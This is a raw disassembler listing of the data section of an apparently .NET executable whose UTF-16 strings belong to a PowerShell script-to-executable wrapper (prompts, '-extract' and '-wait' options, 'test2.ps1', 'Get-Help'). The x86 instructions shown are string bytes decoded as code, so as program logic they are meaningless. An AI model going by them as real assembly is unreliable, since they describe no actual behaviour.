  408c1c:	74 32                	je     0x408c50
  408c1e:	2e 70 73             	jo,pn  0x408c94
  408c21:	31 00                	xor    %eax,(%eax)
  408c23:	00 00                	add    %al,(%eax)
  408c25:	01 00                	add    %eax,(%eax)
  408c27:	21 53 00             	and    %edx,0x0(%ebx)
  408c2a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408c2e:	75 00                	jne    0x408c30
  408c30:	72 00                	jb     0x408c32
  408c32:	65 00 20             	add    %ah,%gs:(%eax)
  408c35:	00 69 00             	add    %ch,0x0(%ecx)
  408c38:	6e                   	outsb  %ds:(%esi),(%dx)
  408c39:	00 70 00             	add    %dh,0x0(%eax)
  408c3c:	75 00                	jne    0x408c3e
  408c3e:	74 00                	je     0x408c40
  408c40:	3a 00                	cmp    (%eax),%al
  408c42:	20 00                	and    %al,(%eax)
  408c44:	20 00                	and    %al,(%eax)
  408c46:	20 00                	and    %al,(%eax)
  408c48:	00 21                	add    %ah,(%ecx)
  408c4a:	49                   	dec    %ecx
  408c4b:	00 6e 00             	add    %ch,0x0(%esi)
  408c4e:	70 00                	jo     0x408c50
  408c50:	75 00                	jne    0x408c52
  408c52:	74 00                	je     0x408c54
  408c54:	3a 00                	cmp    (%eax),%al
  408c56:	20 00                	and    %al,(%eax)
  408c58:	20 00                	and    %al,(%eax)
  408c5a:	20 00                	and    %al,(%eax)
  408c5c:	20 00                	and    %al,(%eax)
  408c5e:	20 00                	and    %al,(%eax)
  408c60:	20 00                	and    %al,(%eax)
  408c62:	20 00                	and    %al,(%eax)
  408c64:	20 00                	and    %al,(%eax)
  408c66:	20 00                	and    %al,(%eax)
  408c68:	20 00                	and    %al,(%eax)
  408c6a:	00 05 4f 00 4b 00    	add    %al,0x4b004f
  408c70:	00 0d 43 00 61 00    	add    %cl,0x610043
  408c76:	6e                   	outsb  %ds:(%esi),(%dx)
  408c77:	00 63 00             	add    %ah,0x0(%ebx)
  408c7a:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  408c7f:	03 00                	add    (%eax),%eax
  408c81:	00 01                	add    %al,(%ecx)
  408c83:	17                   	pop    %ss
  408c84:	50                   	push   %eax
  408c85:	00 72 00             	add    %dh,0x0(%edx)
  408c88:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408c8c:	73 00                	jae    0x408c8e
  408c8e:	20 00                	and    %al,(%eax)
  408c90:	61                   	popa
  408c91:	00 20                	add    %ah,(%eax)
  408c93:	00 6b 00             	add    %ch,0x0(%ebx)
  408c96:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  408c9a:	00 0f                	add    %cl,(%edi)
  408c9c:	23 00                	and    (%eax),%eax
  408c9e:	30 00                	xor    %al,(%eax)
  408ca0:	30 00                	xor    %al,(%eax)
  408ca2:	30 00                	xor    %al,(%eax)
  408ca4:	30 00                	xor    %al,(%eax)
  408ca6:	38 00                	cmp    %al,(%eax)
  408ca8:	30 00                	xor    %al,(%eax)
  408caa:	00 0f                	add    %cl,(%edi)
  408cac:	23 00                	and    (%eax),%eax
  408cae:	38 00                	cmp    %al,(%eax)
  408cb0:	30 00                	xor    %al,(%eax)
  408cb2:	38 00                	cmp    %al,(%eax)
  408cb4:	30 00                	xor    %al,(%eax)
  408cb6:	38 00                	cmp    %al,(%eax)
  408cb8:	30 00                	xor    %al,(%eax)
  408cba:	00 0f                	add    %cl,(%edi)
  408cbc:	23 00                	and    (%eax),%eax
  408cbe:	30 00                	xor    %al,(%eax)
  408cc0:	30 00                	xor    %al,(%eax)
  408cc2:	38 00                	cmp    %al,(%eax)
  408cc4:	30 00                	xor    %al,(%eax)
  408cc6:	30 00                	xor    %al,(%eax)
  408cc8:	30 00                	xor    %al,(%eax)
  408cca:	00 0f                	add    %cl,(%edi)
  408ccc:	23 00                	and    (%eax),%eax
  408cce:	30 00                	xor    %al,(%eax)
  408cd0:	30 00                	xor    %al,(%eax)
  408cd2:	38 00                	cmp    %al,(%eax)
  408cd4:	30 00                	xor    %al,(%eax)
  408cd6:	38 00                	cmp    %al,(%eax)
  408cd8:	30 00                	xor    %al,(%eax)
  408cda:	00 0f                	add    %cl,(%edi)
  408cdc:	23 00                	and    (%eax),%eax
  408cde:	38 00                	cmp    %al,(%eax)
  408ce0:	30 00                	xor    %al,(%eax)
  408ce2:	30 00                	xor    %al,(%eax)
  408ce4:	30 00                	xor    %al,(%eax)
  408ce6:	38 00                	cmp    %al,(%eax)
  408ce8:	30 00                	xor    %al,(%eax)
  408cea:	00 0f                	add    %cl,(%edi)
  408cec:	23 00                	and    (%eax),%eax
  408cee:	38 00                	cmp    %al,(%eax)
  408cf0:	30 00                	xor    %al,(%eax)
  408cf2:	30 00                	xor    %al,(%eax)
  408cf4:	30 00                	xor    %al,(%eax)
  408cf6:	30 00                	xor    %al,(%eax)
  408cf8:	30 00                	xor    %al,(%eax)
  408cfa:	00 0f                	add    %cl,(%edi)
  408cfc:	23 00                	and    (%eax),%eax
  408cfe:	38 00                	cmp    %al,(%eax)
  408d00:	30 00                	xor    %al,(%eax)
  408d02:	38 00                	cmp    %al,(%eax)
  408d04:	30 00                	xor    %al,(%eax)
  408d06:	30 00                	xor    %al,(%eax)
  408d08:	30 00                	xor    %al,(%eax)
  408d0a:	00 0f                	add    %cl,(%edi)
  408d0c:	23 00                	and    (%eax),%eax
  408d0e:	43                   	inc    %ebx
  408d0f:	00 30                	add    %dh,(%eax)
  408d11:	00 43 00             	add    %al,0x0(%ebx)
  408d14:	30 00                	xor    %al,(%eax)
  408d16:	43                   	inc    %ebx
  408d17:	00 30                	add    %dh,(%eax)
  408d19:	00 00                	add    %al,(%eax)
  408d1b:	0f 23 00             	mov    %eax,%db0
  408d1e:	30 00                	xor    %al,(%eax)
  408d20:	30 00                	xor    %al,(%eax)
  408d22:	46                   	inc    %esi
  408d23:	00 46 00             	add    %al,0x0(%esi)
  408d26:	30 00                	xor    %al,(%eax)
  408d28:	30 00                	xor    %al,(%eax)
  408d2a:	00 21                	add    %ah,(%ecx)
  408d2c:	52                   	push   %edx
  408d2d:	00 65 00             	add    %ah,0x0(%ebp)
  408d30:	6d                   	insl   (%dx),%es:(%edi)
  408d31:	00 61 00             	add    %ah,0x0(%ecx)
  408d34:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  408d3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d3b:	00 67 00             	add    %ah,0x0(%edi)
  408d3e:	20 00                	and    %al,(%eax)
  408d40:	74 00                	je     0x408d42
  408d42:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  408d48:	3a 00                	cmp    (%eax),%al
  408d4a:	20 00                	and    %al,(%eax)
  408d4c:	00 29                	add    %ch,(%ecx)
  408d4e:	7b 00                	jnp    0x408d50
  408d50:	30 00                	xor    %al,(%eax)
  408d52:	3a 00                	cmp    (%eax),%al
  408d54:	30 00                	xor    %al,(%eax)
  408d56:	30 00                	xor    %al,(%eax)
  408d58:	7d 00                	jge    0x408d5a
  408d5a:	3a 00                	cmp    (%eax),%al
  408d5c:	7b 00                	jnp    0x408d5e
  408d5e:	31 00                	xor    %eax,(%eax)
  408d60:	3a 00                	cmp    (%eax),%al
  408d62:	30 00                	xor    %al,(%eax)
  408d64:	30 00                	xor    %al,(%eax)
  408d66:	7d 00                	jge    0x408d68
  408d68:	3a 00                	cmp    (%eax),%al
  408d6a:	7b 00                	jnp    0x408d6c
  408d6c:	32 00                	xor    (%eax),%al
  408d6e:	3a 00                	cmp    (%eax),%al
  408d70:	30 00                	xor    %al,(%eax)
  408d72:	30 00                	xor    %al,(%eax)
  408d74:	7d 00                	jge    0x408d76
  408d76:	00 3f                	add    %bh,(%edi)
  408d78:	53                   	push   %ebx
  408d79:	00 79 00             	add    %bh,0x0(%ecx)
  408d7c:	73 00                	jae    0x408d7e
  408d7e:	74 00                	je     0x408d80
  408d80:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408d84:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  408d88:	6f                   	outsl  %ds:(%esi),(%dx)
  408d89:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408d8d:	00 65 00             	add    %ah,0x0(%ebp)
  408d90:	63 00                	arpl   %eax,(%eax)
  408d92:	74 00                	je     0x408d94
  408d94:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d9a:	73 00                	jae    0x408d9c
  408d9c:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  408da0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408da4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408da8:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  408dae:	4c                   	dec    %esp
  408daf:	00 69 00             	add    %ch,0x0(%ecx)
  408db2:	73 00                	jae    0x408db4
  408db4:	74 00                	je     0x408db6
  408db6:	00 03                	add    %al,(%ebx)
  408db8:	31 00                	xor    %eax,(%eax)
  408dba:	00 15 7b 00 30 00    	add    %dl,0x30007b
  408dc0:	7d 00                	jge    0x408dc2
  408dc2:	5b                   	pop    %ebx
  408dc3:	00 7b 00             	add    %bh,0x0(%ebx)
  408dc6:	31 00                	xor    %eax,(%eax)
  408dc8:	7d 00                	jge    0x408dca
  408dca:	5d                   	pop    %ebp
  408dcb:	00 3a                	add    %bh,(%edx)
  408dcd:	00 20                	add    %ah,(%eax)
  408dcf:	00 00                	add    %al,(%eax)
  408dd1:	07                   	pop    %es
  408dd2:	41                   	inc    %ecx
  408dd3:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  408dd7:	00 00                	add    %al,(%eax)
  408dd9:	0f 54 00             	andps  (%eax),%xmm0
  408ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  408ddd:	00 41 00             	add    %al,0x0(%ecx)
  408de0:	72 00                	jb     0x408de2
  408de2:	72 00                	jb     0x408de4
  408de4:	61                   	popa
  408de5:	00 79 00             	add    %bh,0x0(%ecx)
  408de8:	00 0b                	add    %cl,(%ebx)
  408dea:	7b 00                	jnp    0x408dec
  408dec:	30 00                	xor    %al,(%eax)
  408dee:	7d 00                	jge    0x408df0
  408df0:	3a 00                	cmp    (%eax),%al
  408df2:	20 00                	and    %al,(%eax)
  408df4:	00 29                	add    %ch,(%ecx)
  408df6:	0a 00                	or     (%eax),%al
  408df8:	28 00                	sub    %al,(%eax)
  408dfa:	54                   	push   %esp
  408dfb:	00 79 00             	add    %bh,0x0(%ecx)
  408dfe:	70 00                	jo     0x408e00
  408e00:	65 00 20             	add    %ah,%gs:(%eax)
  408e03:	00 21                	add    %ah,(%ecx)
  408e05:	00 3f                	add    %bh,(%edi)
  408e07:	00 20                	add    %ah,(%eax)
  408e09:	00 66 00             	add    %ah,0x0(%esi)
  408e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e0d:	00 72 00             	add    %dh,0x0(%edx)
  408e10:	20 00                	and    %al,(%eax)
  408e12:	68 00 65 00 6c       	push   $0x6c006500
  408e17:	00 70 00             	add    %dh,0x0(%eax)
  408e1a:	2e 00 29             	add    %ch,%cs:(%ecx)
  408e1d:	00 00                	add    %al,(%eax)
  408e1f:	05 21 00 3f 00       	add    $0x3f0021,%eax
  408e24:	00 47 57             	add    %al,0x57(%edi)
  408e27:	00 72 00             	add    %dh,0x0(%edx)
  408e2a:	6f                   	outsl  %ds:(%esi),(%dx)
  408e2b:	00 6e 00             	add    %ch,0x0(%esi)
  408e2e:	67 00 20             	add    %ah,(%bx,%si)
  408e31:	00 66 00             	add    %ah,0x0(%esi)
  408e34:	6f                   	outsl  %ds:(%esi),(%dx)
  408e35:	00 72 00             	add    %dh,0x0(%edx)
  408e38:	6d                   	insl   (%dx),%es:(%edi)
  408e39:	00 61 00             	add    %ah,0x0(%ecx)
  408e3c:	74 00                	je     0x408e3e
  408e3e:	2c 00                	sub    $0x0,%al
  408e40:	20 00                	and    %al,(%eax)
  408e42:	70 00                	jo     0x408e44
  408e44:	6c                   	insb   (%dx),%es:(%edi)
  408e45:	00 65 00             	add    %ah,0x0(%ebp)
  408e48:	61                   	popa
  408e49:	00 73 00             	add    %dh,0x0(%ebx)
  408e4c:	65 00 20             	add    %ah,%gs:(%eax)
  408e4f:	00 72 00             	add    %dh,0x0(%edx)
  408e52:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  408e56:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408e5a:	74 00                	je     0x408e5c
  408e5c:	20 00                	and    %al,(%eax)
  408e5e:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  408e64:	75 00                	jne    0x408e66
  408e66:	74 00                	je     0x408e68
  408e68:	3a 00                	cmp    (%eax),%al
  408e6a:	20 00                	and    %al,(%eax)
  408e6c:	00 07                	add    %al,(%edi)
  408e6e:	08 00                	or     %al,(%eax)
  408e70:	20 00                	and    %al,(%eax)
  408e72:	08 00                	or     %al,(%eax)
  408e74:	01 03                	add    %eax,(%ebx)
  408e76:	2a 00                	sub    (%eax),%al
  408e78:	00 1f                	add    %bl,(%edi)
  408e7a:	50                   	push   %eax
  408e7b:	00 53 00             	add    %dl,0x0(%ebx)
  408e7e:	52                   	push   %edx
  408e7f:	00 75 00             	add    %dh,0x0(%ebp)
  408e82:	6e                   	outsb  %ds:(%esi),(%dx)
  408e83:	00 73 00             	add    %dh,0x0(%ebx)
  408e86:	70 00                	jo     0x408e88
  408e88:	61                   	popa
  408e89:	00 63 00             	add    %ah,0x0(%ebx)
  408e8c:	65 00 2d 00 48 00 6f 	add    %ch,%gs:0x6f004800
  408e93:	00 73 00             	add    %dh,0x0(%ebx)
  408e96:	74 00                	je     0x408e98
  408e98:	01 05 75 00 69 00    	add    %eax,0x690075
  408e9e:	00 0b                	add    %cl,(%ebx)
  408ea0:	2d 00 77 00 61       	sub    $0x61007700,%eax
  408ea5:	00 69 00             	add    %ch,0x0(%ecx)
  408ea8:	74 00                	je     0x408eaa
  408eaa:	01 11                	add    %edx,(%ecx)
  408eac:	2d 00 65 00 78       	sub    $0x78006500,%eax
  408eb1:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408eb5:	00 61 00             	add    %ah,0x0(%ecx)
  408eb8:	63 00                	arpl   %eax,(%eax)
  408eba:	74 00                	je     0x408ebc
  408ebc:	01 03                	add    %eax,(%ebx)
  408ebe:	3a 00                	cmp    (%eax),%al
  408ec0:	00 80 dd 49 00 66    	add    %al,0x660049dd(%eax)
  408ec6:	00 20                	add    %ah,(%eax)
  408ec8:	00 79 00             	add    %bh,0x0(%ecx)
  408ecb:	6f                   	outsl  %ds:(%esi),(%dx)
  408ecc:	00 75 00             	add    %dh,0x0(%ebp)
  408ecf:	20 00                	and    %al,(%eax)
  408ed1:	73 00                	jae    0x408ed3
  408ed3:	70 00                	jo     0x408ed5
  408ed5:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  408ed9:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  408edf:	20 00                	and    %al,(%eax)
  408ee1:	74 00                	je     0x408ee3
  408ee3:	68 00 65 00 20       	push   $0x20006500
  408ee8:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408eee:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408ef2:	00 61 00             	add    %ah,0x0(%ecx)
  408ef5:	63 00                	arpl   %eax,(%eax)
  408ef7:	74 00                	je     0x408ef9
  408ef9:	20 00                	and    %al,(%eax)
  408efb:	6f                   	outsl  %ds:(%esi),(%dx)
  408efc:	00 70 00             	add    %dh,0x0(%eax)
  408eff:	74 00                	je     0x408f01
  408f01:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408f07:	20 00                	and    %al,(%eax)
  408f09:	79 00                	jns    0x408f0b
  408f0b:	6f                   	outsl  %ds:(%esi),(%dx)
  408f0c:	00 75 00             	add    %dh,0x0(%ebp)
  408f0f:	20 00                	and    %al,(%eax)
  408f11:	6e                   	outsb  %ds:(%esi),(%dx)
  408f12:	00 65 00             	add    %ah,0x0(%ebp)
  408f15:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  408f1a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  408f1e:	00 20                	add    %ah,(%eax)
  408f20:	00 61 00             	add    %ah,0x0(%ecx)
  408f23:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  408f28:	00 61 00             	add    %ah,0x0(%ecx)
  408f2b:	20 00                	and    %al,(%eax)
  408f2d:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408f31:	6c                   	insb   (%dx),%es:(%edi)
  408f32:	00 65 00             	add    %ah,0x0(%ebp)
  408f35:	20 00                	and    %al,(%eax)
  408f37:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  408f3b:	72 00                	jb     0x408f3d
  408f3d:	20 00                	and    %al,(%eax)
  408f3f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  408f43:	74 00                	je     0x408f45
  408f45:	72 00                	jb     0x408f47
  408f47:	61                   	popa
  408f48:	00 63 00             	add    %ah,0x0(%ebx)
  408f4b:	74 00                	je     0x408f4d
  408f4d:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408f53:	20 00                	and    %al,(%eax)
  408f55:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  408f5b:	74 00                	je     0x408f5d
  408f5d:	68 00 69 00 73       	push   $0x73006900
  408f62:	00 20                	add    %ah,(%eax)
  408f64:	00 77 00             	add    %dh,0x0(%edi)
  408f67:	61                   	popa
  408f68:	00 79 00             	add    %bh,0x0(%ecx)
  408f6b:	0d 00 0a 00 20       	or     $0x20000a00,%eax
  408f70:	00 20                	add    %ah,(%eax)
  408f72:	00 20                	add    %ah,(%eax)
  408f74:	00 2d 00 65 00 78    	add    %ch,0x78006500
  408f7a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408f7e:	00 61 00             	add    %ah,0x0(%ecx)
  408f81:	63 00                	arpl   %eax,(%eax)
  408f83:	74 00                	je     0x408f85
  408f85:	3a 00                	cmp    (%eax),%al
  408f87:	22 00                	and    (%eax),%al
  408f89:	3c 00                	cmp    $0x0,%al
  408f8b:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408f8f:	6c                   	insb   (%dx),%es:(%edi)
  408f90:	00 65 00             	add    %ah,0x0(%ebp)
  408f93:	6e                   	outsb  %ds:(%esi),(%dx)
  408f94:	00 61 00             	add    %ah,0x0(%ecx)
  408f97:	6d                   	insl   (%dx),%es:(%edi)
  408f98:	00 65 00             	add    %ah,0x0(%ebp)
  408f9b:	3e 00 22             	add    %ah,%ds:(%edx)
  408f9e:	00 01                	add    %al,(%ecx)
  408fa0:	09 2d 00 65 00 6e    	or     %ebp,0x6e006500
  408fa6:	00 64 00 01          	add    %ah,0x1(%eax,%eax,1)
  408faa:	05 2d 00 3f 00       	add    $0x3f002d,%eax
  408faf:	01 13                	add    %edx,(%ebx)
  408fb1:	2d 00 64 00 65       	sub    $0x65006400,%eax
  408fb6:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408fba:	00 69 00             	add    %ch,0x0(%ecx)
  408fbd:	6c                   	insb   (%dx),%es:(%edi)
  408fbe:	00 65 00             	add    %ah,0x0(%ebp)
  408fc1:	64 00 01             	add    %al,%fs:(%ecx)
  408fc4:	13 2d 00 65 00 78    	adc    0x78006500,%ebp
  408fca:	00 61 00             	add    %ah,0x0(%ecx)
  408fcd:	6d                   	insl   (%dx),%es:(%edi)
  408fce:	00 70 00             	add    %dh,0x0(%eax)
  408fd1:	6c                   	insb   (%dx),%es:(%edi)
  408fd2:	00 65 00             	add    %ah,0x0(%ebp)
  408fd5:	73 00                	jae    0x408fd7
  408fd7:	01 0b                	add    %ecx,(%ebx)
  408fd9:	2d 00 66 00 75       	sub    $0x75006600,%eax
  408fde:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408fe2:	00 01                	add    %al,(%ecx)
  408fe4:	0d 2d 00 64 00       	or     $0x64002d,%eax
  408fe9:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  408fed:	75 00                	jne    0x408fef
  408fef:	67 00 01             	add    %al,(%bx,%di)
  408ff2:	13 74 00 65          	adc    0x65(%eax,%eax,1),%esi
  408ff6:	00 73 00             	add    %dh,0x0(%ebx)
  408ff9:	74 00                	je     0x408ffb
  408ffb:	32 00                	xor    (%eax),%al
  408ffd:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  409001:	73 00                	jae    0x409003
  409003:	31 00                	xor    %eax,(%eax)
  409005:	00 13                	add    %dl,(%ebx)
  409007:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40900b:	6e                   	outsb  %ds:(%esi),(%dx)
  40900c:	00 63 00             	add    %ah,0x0(%ebx)
  40900f:	74 00                	je     0x409011
  409011:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409017:	20 00                	and    %al,(%eax)
  409019:	00 03                	add    %al,(%ebx)
  40901b:	7b 00                	jnp    0x40901d
  40901d:	00 19                	add    %bl,(%ecx)
  40901f:	7d 00                	jge    0x409021
  409021:	3b 00                	cmp    (%eax),%eax
  409023:	20 00                	and    %al,(%eax)
  409025:	47                   	inc    %edi
  409026:	00 65 00             	add    %ah,0x0(%ebp)
  409029:	74 00                	je     0x40902b
  40902b:	2d 00 48 00 65       	sub    $0x65004800,%eax
  409030:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  409034:	00 20                	add    %ah,(%eax)
  409036:	00 01                	add    %al,(%ecx)
  409038:	03 20                	add    (%eax),%esp
  40903a:	00 00                	add    %al,(%eax)
  40903c:	1b 20                	sbb    (%eax),%esp
  40903e:	00 7c 00 20          	add    %bh,0x20(%eax,%eax,1)
  409042:	00 4f 00             	add    %cl,0x0(%edi)
  409045:	75 00                	jne    0x409047
  409047:	74 00                	je     0x409049
  409049:	2d 00 53 00 74       	sub    $0x74005300,%eax
  40904e:	00 72 00             	add    %dh,0x0(%edx)
  409051:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409057:	01 2f                	add    %ebp,(%edi)
  409059:	5e                   	pop    %esi
  40905a:	00 2d 00 28 00 5b    	add    %ch,0x5b002800
  409060:	00 5e 00             	add    %bl,0x0(%esi)
  409063:	3a 00                	cmp    (%eax),%al
  409065:	20 00                	and    %al,(%eax)
  409067:	5d                   	pop    %ebp
  409068:	00 2b                	add    %ch,(%ebx)
  40906a:	00 29                	add    %ch,(%ecx)
  40906c:	00 5b 00             	add    %bl,0x0(%ebx)
  40906f:	20 00                	and    %al,(%eax)
  409071:	3a 00                	cmp    (%eax),%al
  409073:	5d                   	pop    %ebp
  409074:	00 3f                	add    %bh,(%edi)
  409076:	00 28                	add    %ch,(%eax)
  409078:	00 5b 00             	add    %bl,0x0(%ebx)
  40907b:	5e                   	pop    %esi
  40907c:	00 3a                	add    %bh,(%edx)
  40907e:	00 5d 00             	add    %bl,0x0(%ebp)
  409081:	2a 00                	sub    (%eax),%al
  409083:	29 00                	sub    %eax,(%eax)
  409085:	24 00                	and    $0x0,%al
  409087:	01 09                	add    %ecx,(%ecx)
  409089:	54                   	push   %esp
  40908a:	00 72 00             	add    %dh,0x0(%edx)
  40908d:	75 00                	jne    0x40908f
  40908f:	65 00 00             	add    %al,%gs:(%eax)
  409092:	0b 24 00             	or     (%eax,%eax,1),%esp
  409095:	54                   	push   %esp
  409096:	00 52 00             	add    %dl,0x0(%edx)
  409099:	55                   	push   %ebp
  40909a:	00 45 00             	add    %al,0x0(%ebp)
  40909d:	00 0b                	add    %cl,(%ebx)
  40909f:	46                   	inc    %esi
  4090a0:	00 61 00             	add    %ah,0x0(%ecx)
  4090a3:	6c                   	insb   (%dx),%es:(%edi)
  4090a4:	00 73 00             	add    %dh,0x0(%ebx)
  4090a7:	65 00 00             	add    %al,%gs:(%eax)
  4090aa:	0d 24 00 46 00       	or     $0x460024,%eax
  4090af:	41                   	inc    %ecx
  4090b0:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  4090b4:	00 45 00             	add    %al,0x0(%ebp)
  4090b7:	00 15 4f 00 75 00    	add    %dl,0x75004f
  4090bd:	74 00                	je     0x4090bf
  4090bf:	2d 00 53 00 74       	sub    $0x74005300,%eax
  4090c4:	00 72 00             	add    %dh,0x0(%edx)
  4090c7:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4090cd:	01 0d 53 00 74 00    	add    %ecx,0x740053
  4090d3:	72 00                	jb     0x4090d5
  4090d5:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4090d9:	6d                   	insl   (%dx),%es:(%edi)
  4090da:	00 00                	add    %al,(%eax)
  4090dc:	27                   	daa
  4090dd:	43                   	inc    %ebx
  4090de:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4090e2:	00 63 00             	add    %ah,0x0(%ebx)
  4090e5:	6b 00 20             	imul   $0x20,(%eax),%eax
  4090e8:	00 4f 00             	add    %cl,0x0(%edi)
  4090eb:	4b                   	dec    %ebx
  4090ec:	00 20                	add    %ah,(%eax)
  4090ee:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4090f2:	00 20                	add    %ah,(%eax)
  4090f4:	00 65 00             	add    %ah,0x0(%ebp)
  4090f7:	78 00                	js     0x4090f9
  4090f9:	69 00 74 00 2e 00    	imul   $0x2e0074,(%eax),%eax
  4090ff:	2e 00 2e             	add    %ch,%cs:(%esi)
  409102:	00 00                	add    %al,(%eax)
  409104:	2f                   	das
  409105:	55                   	push   %ebp
  409106:	00 6e 00             	add    %ch,0x0(%esi)
  409109:	68 00 61 00 6e       	push   $0x6e006100
  40910e:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409112:	00 65 00             	add    %ah,0x0(%ebp)
  409115:	64 00 20             	add    %ah,%fs:(%eax)
  409118:	00 65 00             	add    %ah,0x0(%ebp)
  40911b:	78 00                	js     0x40911d
  40911d:	63 00                	arpl   %eax,(%eax)
  40911f:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409123:	74 00                	je     0x409125
  409125:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40912b:	20 00                	and    %al,(%eax)
  40912d:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  409133:	00 98 ae d5 3b 79    	add    %bl,0x793bd5ae(%eax)
  409139:	03 da                	add    %edx,%ebx
  40913b:	4c                   	dec    %esp
  40913c:	bb c5 cc 07 ba       	mov    $0xba07ccc5,%ebx
  409141:	93                   	xchg   %eax,%ebx
  409142:	f5                   	cmc
  409143:	ea 00 08 b7 7a 5c 56 	ljmp   $0x565c,$0x7ab70800
  40914a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40914d:	89 08                	mov    %ecx,(%eax)
  40914f:	31 bf 38 56 ad 36    	xor    %edi,0x36ad5638(%edi)
  409155:	4e                   	dec    %esi
  409156:	35 14 00 0a 11       	xor    $0x110a0014,%eax
  40915b:	14 10                	adc    $0x10,%al
  40915d:	11 0c 0e             	adc    %ecx,(%esi,%ecx,1)
  409160:	18 08                	sbb    %cl,(%eax)
  409162:	12 21                	adc    (%ecx),%ah
  409164:	08 12                	or     %dl,(%edx)
  409166:	21 08                	and    %ecx,(%eax)
  409168:	10 02                	adc    %al,(%edx)
  40916a:	11 10                	adc    %edx,(%eax)
  40916c:	0c 00                	or     $0x0,%al
  40916e:	06                   	push   %es
  40916f:	12 18                	adc    (%eax),%bl
  409171:	0e                   	push   %cs
  409172:	0e                   	push   %cs
  409173:	0e                   	push   %cs
  409174:	0e                   	push   %cs
  409175:	11 25 11 29 03 20    	adc    %esp,0x20032911
  40917b:	00 01                	add    %al,(%ecx)
  40917d:	02 06                	add    (%esi),%al
  40917f:	08 02                	or     %al,(%edx)
  409181:	06                   	push   %es
  409182:	18 02                	sbb    %al,(%edx)
  409184:	06                   	push   %es
  409185:	0e                   	push   %cs
  409186:	03 06                	add    (%esi),%eax
  409188:	11 10                	adc    %edx,(%eax)
  40918a:	04 01                	add    $0x1,%al
  40918c:	00 00                	add    %al,(%eax)
  40918e:	00 04 02             	add    %al,(%edx,%eax,1)
  409191:	00 00                	add    %al,(%eax)
  409193:	00 04 04             	add    %al,(%esp,%eax,1)
  409196:	00 00                	add    %al,(%eax)
  409198:	00 04 08             	add    %al,(%eax,%ecx,1)
  40919b:	00 00                	add    %al,(%eax)
  40919d:	00 04 10             	add    %al,(%eax,%edx,1)
  4091a0:	00 00                	add    %al,(%eax)
  4091a2:	00 04 40             	add    %al,(%eax,%eax,2)
  4091a5:	00 00                	add    %al,(%eax)
  4091a7:	00 04 80             	add    %al,(%eax,%eax,4)
  4091aa:	00 00                	add    %al,(%eax)
  4091ac:	00 04 00             	add    %al,(%eax,%eax,1)
  4091af:	01 00                	add    %eax,(%eax)
  4091b1:	00 04 00             	add    %al,(%eax,%eax,1)
  4091b4:	02 00                	add    (%eax),%al
  4091b6:	00 04 00             	add    %al,(%eax,%eax,1)
  4091b9:	04 00                	add    $0x0,%al
  4091bb:	00 04 00             	add    %al,(%eax,%eax,1)
  4091be:	08 00                	or     %al,(%eax)
  4091c0:	00 04 00             	add    %al,(%eax,%eax,1)
  4091c3:	10 00                	adc    %al,(%eax)
  4091c5:	00 04 00             	add    %al,(%eax,%eax,1)
  4091c8:	40                   	inc    %eax
  4091c9:	00 00                	add    %al,(%eax)
  4091cb:	04 00                	add    $0x0,%al
  4091cd:	00 02                	add    %al,(%edx)
  4091cf:	00 04 00             	add    %al,(%eax,%eax,1)
  4091d2:	00 04 00             	add    %al,(%eax,%eax,1)
